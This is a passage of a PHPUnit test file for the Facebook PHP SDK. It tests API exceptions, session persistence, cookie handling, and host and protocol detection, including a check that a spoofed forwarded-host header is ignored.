    $proof = $fb->publicGetAppSecretProof($token);
    $params = array();
    $fb->api('/mattynoce', $params);
    $requests = $fb->publicGetRequests();
    $this->assertEquals($proof, $requests[0]['params']['appsecret_proof']);
  }

  public function testAppsecretProofWithParams() {
    $fb = new FBRecordMakeRequest(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $proof = 'foo';
    $params = array('appsecret_proof' => $proof);
    $fb->api('/mattynoce', $params);
    $requests = $fb->publicGetRequests();
    $this->assertEquals($proof, $requests[0]['params']['appsecret_proof']);
  }

  public function testExceptionConstructorWithErrorCode() {
    $code = 404;
    $e = new FacebookApiException(array('error_code' => $code));
    $this->assertEquals($code, $e->getCode());
  }

  public function testExceptionConstructorWithInvalidErrorCode() {
    $e = new FacebookApiException(array('error_code' => 'not an int'));
    $this->assertEquals(0, $e->getCode());
  }

  // this happens often despite the fact that it is useless
  public function testExceptionTypeFalse() {
    $e = new FacebookApiException(false);
    $this->assertEquals('Exception', $e->getType());
  }

  public function testExceptionTypeMixedDraft00() {
    $e = new FacebookApiException(array('error' => array('message' => 'foo')));
    $this->assertEquals('Exception', $e->getType());
  }

  public function testExceptionTypeDraft00() {
    $error = 'foo';
    $e = new FacebookApiException(
      array('error' => array('type' => $error, 'message' => 'hello world')));
    $this->assertEquals($error, $e->getType());
  }

  public function testExceptionTypeDraft10() {
    $error = 'foo';
    $e = new FacebookApiException(array('error' => $error));
    $this->assertEquals($error, $e->getType());
  }

  public function testExceptionTypeDefault() {
    $e = new FacebookApiException(array('error' => false));
    $this->assertEquals('Exception', $e->getType());
  }

  public function testExceptionToString() {
    $e = new FacebookApiException(array(
      'error_code' => 1,
      'error_description' => 'foo',
    ));
    $this->assertEquals('Exception: 1: foo', (string) $e);
  }

  public function testDestroyClearsCookie() {
    $fb = new FBPublicCookie(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $_COOKIE[$fb->publicGetSignedRequestCookieName()] = 'foo';
    $_COOKIE[$fb->publicGetMetadataCookieName()] = 'base_domain=fbrell.com';
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $fb->destroySession();
    $this->assertFalse(
      array_key_exists($fb->publicGetSignedRequestCookieName(), $_COOKIE));
  }

  public function testAuthExpireSessionDestroysSession() {
    $methods_to_stub = array(
      '_oauthRequest',
      'destroySession',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $key = 'foo';
    $val = 42;
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('_oauthRequest')
      ->will($this->returnValue("{\"$key\":$val}"));
    $stub
      ->expects($this->once())
      ->method('destroySession');
    $this->assertEquals(
      array($key => $val),
      $stub->api(array('method' => 'auth.expireSession'))
    );
  }

  public function testLowercaseAuthRevokeAuthDestroysSession() {
    $methods_to_stub = array(
      '_oauthRequest',
      'destroySession',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $key = 'foo';
    $val = 42;
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('_oauthRequest')
      ->will($this->returnValue("{\"$key\":$val}"));
    $stub
      ->expects($this->once())
      ->method('destroySession');
    $this->assertEquals(
      array($key => $val),
      $stub->api(array('method' => 'auth.revokeauthorization'))
    );
  }

  /**
   * @expectedException FacebookAPIException
   */
  public function testErrorCodeFromRestAPIThrowsException() {
    $methods_to_stub = array(
      '_oauthRequest',
    );
    $constructor_args = array(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET
    ));
    $stub = $this->getMock(
      'TransientFacebook', $methods_to_stub, $constructor_args);
    $stub
      ->expects($this->once())
      ->method('_oauthRequest')
      ->will($this->returnValue('{"error_code": 500}'));
    $stub->api(array('method' => 'foo'));
  }

  public function testJsonEncodeOfNonStringParams() {
    $foo = array(1, 2);
    $params = array(
      'method' => 'get',
      'foo' => $foo,
    );
    $fb = new FBRecordMakeRequest(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $fb->api('/naitik', $params);
    $requests = $fb->publicGetRequests();
    $this->assertEquals(json_encode($foo), $requests[0]['params']['foo']);
  }

  public function testSessionBackedFacebook() {
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $key = 'state';
    $val = 'foo';
    $fb->publicSetPersistentData($key, $val);
    $this->assertEquals(
      $val,
      $_SESSION[sprintf('fb_%s_%s', self::APP_ID, $key)]
    );
    $this->assertEquals(
      $val,
      $fb->publicGetPersistentData($key)
    );
  }

  public function testSessionBackedFacebookIgnoresUnsupportedKey() {
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $key = '--invalid--';
    $val = 'foo';
    $fb->publicSetPersistentData($key, $val);
    $this->assertFalse(
      array_key_exists(
        sprintf('fb_%s_%s', self::APP_ID, $key),
        $_SESSION
      )
    );
    $this->assertFalse($fb->publicGetPersistentData($key));
  }

  public function testClearSessionBackedFacebook() {
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $key = 'state';
    $val = 'foo';
    $fb->publicSetPersistentData($key, $val);
    $this->assertEquals(
      $val,
      $_SESSION[sprintf('fb_%s_%s', self::APP_ID, $key)]
    );
    $this->assertEquals(
      $val,
      $fb->publicGetPersistentData($key)
    );
    $fb->publicClearPersistentData($key);
    $this->assertFalse(
      array_key_exists(
        sprintf('fb_%s_%s', self::APP_ID, $key),
        $_SESSION
      )
    );
    $this->assertFalse($fb->publicGetPersistentData($key));
  }

  public function testSessionBackedFacebookIgnoresUnsupportedKeyInClear() {
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $key = '--invalid--';
    $val = 'foo';
    $session_var_name = sprintf('fb_%s_%s', self::APP_ID, $key);
    $_SESSION[$session_var_name] = $val;
    $fb->publicClearPersistentData($key);
    $this->assertTrue(array_key_exists($session_var_name, $_SESSION));
    $this->assertFalse($fb->publicGetPersistentData($key));
  }

  public function testClearAllSessionBackedFacebook() {
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $key = 'state';
    $val = 'foo';
    $session_var_name = sprintf('fb_%s_%s', self::APP_ID, $key);
    $fb->publicSetPersistentData($key, $val);
    $this->assertEquals($val, $_SESSION[$session_var_name]);
    $this->assertEquals($val, $fb->publicGetPersistentData($key));
    $fb->publicClearAllPersistentData();
    $this->assertFalse(array_key_exists($session_var_name, $_SESSION));
    $this->assertFalse($fb->publicGetPersistentData($key));
  }

  public function testSharedSessionBackedFacebook() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));
    $key = 'state';
    $val = 'foo';
    $session_var_name = sprintf(
      '%s_fb_%s_%s',
      $fb->publicGetSharedSessionID(),
      self::APP_ID,
      $key
    );
    $fb->publicSetPersistentData($key, $val);
    $this->assertEquals($val, $_SESSION[$session_var_name]);
    $this->assertEquals($val, $fb->publicGetPersistentData($key));
  }

  public function testSharedSessionBackedFacebookIgnoresUnsupportedKey() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));
    $key = '--invalid--';
    $val = 'foo';
    $session_var_name = sprintf(
      '%s_fb_%s_%s',
      $fb->publicGetSharedSessionID(),
      self::APP_ID,
      $key
    );
    $fb->publicSetPersistentData($key, $val);
    $this->assertFalse(array_key_exists($session_var_name, $_SESSION));
    $this->assertFalse($fb->publicGetPersistentData($key));
  }

  public function testSharedClearSessionBackedFacebook() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));
    $key = 'state';
    $val = 'foo';
    $session_var_name = sprintf(
      '%s_fb_%s_%s',
      $fb->publicGetSharedSessionID(),
      self::APP_ID,
      $key
    );
    $fb->publicSetPersistentData($key, $val);
    $this->assertEquals($val, $_SESSION[$session_var_name]);
    $this->assertEquals($val, $fb->publicGetPersistentData($key));
    $fb->publicClearPersistentData($key);
    $this->assertFalse(array_key_exists($session_var_name, $_SESSION));
    $this->assertFalse($fb->publicGetPersistentData($key));
  }

  public function testSharedSessionBackedFacebookIgnoresUnsupportedKeyInClear() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));
    $key = '--invalid--';
    $val = 'foo';
    $session_var_name = sprintf(
      '%s_fb_%s_%s',
      $fb->publicGetSharedSessionID(),
      self::APP_ID,
      $key
    );
    $_SESSION[$session_var_name] = $val;
    $fb->publicClearPersistentData($key);
    $this->assertTrue(array_key_exists($session_var_name, $_SESSION));
    $this->assertFalse($fb->publicGetPersistentData($key));
  }

  public function testSharedClearAllSessionBackedFacebook() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));
    $key = 'state';
    $val = 'foo';
    $session_var_name = sprintf(
      '%s_fb_%s_%s',
      $fb->publicGetSharedSessionID(),
      self::APP_ID,
      $key
    );
    $fb->publicSetPersistentData($key, $val);
    $this->assertEquals($val, $_SESSION[$session_var_name]);
    $this->assertEquals($val, $fb->publicGetPersistentData($key));
    $fb->publicClearAllPersistentData();
    $this->assertFalse(array_key_exists($session_var_name, $_SESSION));
    $this->assertFalse($fb->publicGetPersistentData($key));
  }

  public function testSharedSessionBackedFacebookIsRestored() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));
    $key = 'state';
    $val = 'foo';
    $shared_session_id = $fb->publicGetSharedSessionID();
    $session_var_name = sprintf(
      '%s_fb_%s_%s',
      $shared_session_id,
      self::APP_ID,
      $key
    );
    $fb->publicSetPersistentData($key, $val);
    $this->assertEquals($val, $_SESSION[$session_var_name]);
    $this->assertEquals($val, $fb->publicGetPersistentData($key));

    // check the new instance has the same data
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));
    $this->assertEquals(
      $shared_session_id,
      $fb->publicGetSharedSessionID()
    );
    $this->assertEquals($val, $fb->publicGetPersistentData($key));
  }

  public function testSharedSessionBackedFacebookIsNotRestoredWhenCorrupt() {
    $_SERVER['HTTP_HOST'] = 'fbrell.com';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));
    $key = 'state';
    $val = 'foo';
    $shared_session_id = $fb->publicGetSharedSessionID();
    $session_var_name = sprintf(
      '%s_fb_%s_%s',
      $shared_session_id,
      self::APP_ID,
      $key
    );
    $fb->publicSetPersistentData($key, $val);
    $this->assertEquals($val, $_SESSION[$session_var_name]);
    $this->assertEquals($val, $fb->publicGetPersistentData($key));

    // break the cookie
    $cookie_name = $fb->publicGetSharedSessionCookieName();
    $_COOKIE[$cookie_name] = substr($_COOKIE[$cookie_name], 1);

    // check the new instance does not have the data
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'sharedSession' => true,
    ));
    $this->assertFalse($fb->publicGetPersistentData($key));
    $this->assertNotEquals(
      $shared_session_id,
      $fb->publicGetSharedSessionID()
    );
  }

  public function testHttpHost() {
    $real = 'foo.com';
    $_SERVER['HTTP_HOST'] = $real;
    $_SERVER['HTTP_X_FORWARDED_HOST'] = 'evil.com';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $this->assertEquals($real, $fb->publicGetHttpHost());
  }

  public function testHttpProtocol() {
    $_SERVER['HTTPS'] = 'on';
    $_SERVER['HTTP_X_FORWARDED_PROTO'] = 'http';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
    ));
    $this->assertEquals('https', $fb->publicGetHttpProtocol());
  }

  public function testHttpHostForwarded() {
    $real = 'foo.com';
    $_SERVER['HTTP_HOST'] = 'localhost';
    $_SERVER['HTTP_X_FORWARDED_HOST'] = $real;
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'trustForwarded' => true,
    ));
    $this->assertEquals($real, $fb->publicGetHttpHost());
  }

  public function testHttpProtocolForwarded() {
    $_SERVER['HTTPS'] = 'on';
    $_SERVER['HTTP_X_FORWARDED_PROTO'] = 'http';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'trustForwarded' => true,
    ));
    $this->assertEquals('http', $fb->publicGetHttpProtocol());
  }

  public function testHttpProtocolForwardedSecure() {
    $_SERVER['HTTPS'] = 'on';
    $_SERVER['HTTP_X_FORWARDED_PROTO'] = 'https';
    $fb = new PersistentFBPublic(array(
      'appId'  => self::APP_ID,
      'secret' => self::SECRET,
      'trustForwarded' => true,
    ));
    $this->assertEquals('https', $fb->publicGetHttpProtocol());
  }

  /**
   * @dataProvider provideEndsWith
   */
  public function testEndsWith($big, $small, $result) {
    $this->assertEquals(
      $result,
      PersistentFBPublic::publicEndsWith($big, $small)
    );
  }

  public function provideEndsWith() {
    return array(
      array('', '', true),
      array('', 'a', false),
      array('a', '', true),
      array('a', 'b', false),
      array('a', 'a', true),
      array('aa', 'a', true),
      array('ab', 'a', false),
      array('ba', 'a', true),
    );
  }

  /**
   * @dataProvider provideIsAllowedDomain
   */
  public function testIsAllowedDomain($big, $small, $result) {
    $this->assertEquals(
      $result,
      PersistentFBPublic::publicIsAllowedDomain($big, $small)
    );
  }

  public function provideIsAllowedDomain() {
    return array(
      array('fbrell.com', 'fbrell.com', true),
      array('foo.fbrell.com', 'fbrell.com', true),
      array('foofbrell.com', 'fbrell.com', false),
      array('evil.com', 'fbrell.com', false),
      array('foo.fbrell.com', 'bar.fbrell.com', false),
    );
  }

  protected function generateMD5HashOfRandomValue() {
    return md5(uniqid(mt_rand(), true));
  }

  protected function setUp() {
    parent::setUp();
  }

  protected function tearDown() {
    $this->clearSuperGlobals();
    parent::tearDown();
  }

  protected function clearSuperGlobals() {
    unset($_SERVER['HTTPS']);
    unset($_SERVER['HTTP_HOST']);
    unset($_SERVER['REQUEST_URI']);
    $_SESSION = array();
    $_COOKIE = array();
    $_REQUEST = array();
    $_POST = array();
    $_GET = array();
    if (session_id()) {
      session_destroy();
    }
  }

  /**
   * Checks that the correct args are a subset of the returned obj
   * @param  array $correct The correct array values
   * @param  array $actual  The values in practice
   * @param  string $message to be shown on failure
   */
  protected function assertIsSubset($correct, $actual, $msg='') {
    foreach ($correct as $key => $value) {
      $actual_value = $actual[$key];
      $newMsg = (strlen($msg) ? ($msg.' ') : '').'Key: '.$key;
      $this->assertEquals($value, $actual_value, $newMsg);
    }
  }
}

class TransientFacebook extends BaseFacebook {
  protected function setPersistentData($key, $value) {}
  protected function getPersistentData($key, $default = false) {
    return $default;
  }
  protected function clearPersistentData($key) {}
  protected function clearAllPersistentData() {}
}

class FBRecordURL extends TransientFacebook {
  private $url;

  protected function _oauthRequest($url, $params) {
    $this->url = $url;
  }

  public function getRequestedURL() {
    return $this->url;
  }
}

class FBRecordMakeRequest extends TransientFacebook {
  private $requests = array();

  protected function makeRequest($url, $params, $ch=null) {
    $this->requests[] = array(
      'url' => $url,
      'params' => $params,
    );
    return parent::makeRequest($url, $params, $ch);
  }

  public function publicGetRequests() {
    return $this->requests;
  }

  public function publicGetAppSecretProof($access_token) {
    return $this->getAppSecretProof($access_token);
  }
}

class FBPublic extends TransientFacebook {
  public static function publicBase64UrlDecode($input) {
    return self::base64UrlDecode($input);
  }
  public static function publicBase64UrlEncode($input) {
    return self::base64UrlEncode($input);
  }
  public function publicParseSignedRequest($input) {
    return $this->parseSignedRequest($input);
  }
  public function publicMakeSignedRequest($data) {
    return $this->makeSignedRequest($data);
  }
}

class PersistentFBPublic extends Facebook {
  public function publicParseSignedRequest($input) {
    return $this->parseSignedRequest($input);
  }

  public function publicSetPersistentData($key, $value) {
    $this->setPersistentData($key, $value);
  }

  public function publicGetPersistentData($key, $default = false) {
    return $this->getPersistentData($key, $default);
  }

  public function publicClearPersistentData($key) {
    return $this->clearPersistentData($key);
  }

  public function publicClearAllPersistentData() {
    return $this->clearAllPersistentData();
  }

  public function publicGetSharedSessionID() {
    return $this->sharedSessionID;
  }

  public static function publicIsAllowedDomain($big, $small) {
    return self::isAllowedDomain($big, $small);
  }

  public static function publicEndsWith($big, $small) {
    return self::endsWith($big, $small);
  }

  public function publicGetSharedSessionCookieName() {
    return $this->getSharedSessionCookieName();
  }

  public function publicGetHttpHost() {
    return $this->getHttpHost();
  }

  public function publicGetHttpProtocol() {
    return $this->getHttpProtocol();
  }
}

class FBCode extends Facebook {
  public function publicGetCode() {
    return $this->getCode();
  }

  public function publicGetState() {
    return $this->state;
  }

  public function setCSRFStateToken() {
    $this->establishCSRFTokenState();
  }

  public function getCSRFStateToken() {
    return $this->getPersistentData('state');
  }
}

class FBAccessToken extends TransientFacebook {
  public function publicGetApplicationAccessToken() {
    return $this->getApplicationAccessToken();
  }
}

class FBGetCurrentURLFacebook extends TransientFacebook {
  public function publicGetCurrentUrl() {
    return $this->getCurrentUrl();
  }
}

class FBPublicCookie extends TransientFacebook {
  public function publicGetSignedRequest() {
    return $this->getSignedRequest();
  }

  public function publicGetSignedRequestCookieName() {
    return $this->getSignedRequestCookieName();
  }

  public function publicGetMetadataCookie() {
    return $this->getMetadataCookie();
  }

  public function publicGetMetadataCookieName() {
    return $this->getMetadataCookieName();
  }
}

class FBRewrite extends Facebook{

  public function uncacheSignedRequest(){
    $this->signedRequest = null;
  }

  public function uncache()
  {
    $this->user = null;
    $this->signedRequest = null;
    $this->accessToken = null;
  }
}


class FBPublicGetAccessTokenFromCode extends TransientFacebook {
  public function publicGetAccessTokenFromCode($code, $redirect_uri = null) {
    return $this->getAccessTokenFromCode($code, $redirect_uri);
  }
}

class FBPublicState extends TransientFacebook {
  const STATE = 'foo';
  protected function getPersistentData($key, $default = false) {
    if ($key === 'state') {
      return self::STATE;
    }
    return parent::getPersistentData($key, $default);
  }

  public function publicGetState() {
    return $this->state;
  }
}
